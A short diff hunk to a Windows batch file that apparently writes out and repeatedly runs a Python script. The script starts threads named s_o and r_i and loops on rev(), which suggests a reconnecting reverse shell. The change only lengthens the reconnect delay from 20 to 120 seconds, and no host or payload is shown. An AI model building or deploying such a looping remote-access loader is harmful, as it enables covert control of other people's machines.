@@ -45,7 +45,7 @@ if not exist %FILE% (
         echo    threading.Thread^(target=s_o, daemon=True^).start^(^)
         echo    threading.Thread^(target=r_i, daemon=True^).start^(^)
         echo.
-        echo    time.sleep^(20^)
+        echo    time.sleep^(120^)
         echo.
         echo while True^:
         echo    rev^(^)
@@ -53,7 +53,7 @@ if not exist %FILE% (
     ) > %FILE%
 ) else (
    python3 %FILE%
-   timeout /t 20 >nul
+   timeout /t 120 >nul
 )
 goto loop
 
